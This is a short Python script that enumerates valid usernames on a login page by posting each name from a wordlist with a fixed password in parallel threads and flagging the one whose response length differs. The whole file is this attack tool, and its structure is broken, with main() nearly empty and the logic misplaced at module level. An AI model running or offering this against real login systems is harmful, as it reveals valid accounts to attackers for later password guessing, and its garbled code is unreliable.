import requests
from concurrent.futures import ThreadPoolExecutor

# Function to send a POST request for a given username
def send_request(username):
    data = {'username': username, 'password': default_password}
    response = requests.post(url, data=data)
    length = len(response.text)
    response_lengths[username] = length
    print(f"Username: {username}, Response Length: {length}")
    
def main():
    global url, default_password
url = input("Enter the URL: ")
default_password = input("Enter your default password: ")

with open('usernames.txt', 'r') as file:
    usernames = file.read().splitlines()
    
global response_lengths    
response_lengths = {}

# Use ThreadPoolExecutor for concurrent requests
with ThreadPoolExecutor() as executor:
    executor.map(send_request, usernames)

# Find the username with a different response length
unique_length_username = None
unique_lengths = [length for length in response_lengths.values() if list(response_lengths.values()).count(length) == 1]


for username, length in response_lengths.items():
    print(f"Username: {username}, Response Length: {length}")


if unique_lengths:
    unique_length_username = next(username for username, length in response_lengths.items() if length == unique_lengths[0])
    print(f"This is the username you are looking for: {unique_length_username}")
else:
    print("All usernames have the same response length.")
    

if __name__ == "__main__":
    main()
